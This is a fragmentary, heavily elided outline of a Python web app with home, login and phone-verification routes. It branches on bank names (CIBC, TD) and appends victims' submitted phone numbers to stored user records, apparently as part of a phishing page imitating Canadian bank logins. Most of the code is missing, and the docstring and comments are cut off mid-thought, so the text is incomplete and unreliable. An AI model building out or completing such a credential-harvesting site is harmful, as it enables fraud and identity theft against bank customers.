...
def home():
    ...
    so we know it's CIBC. You can rename or restructure as you wish.
    """
...
def login():
    if request.method == "POST":
        ...
        # Redirect to the correct phone verification
        if bank == "TD":
            # Send them to /td_phone
    ...
    # If GET, just show a generic login (or redirect somewhere)
...
def phone_verification():
    ...
    if request.method == "POST":
        ...
        # Append phone number to the same user record
        updated_lines = []
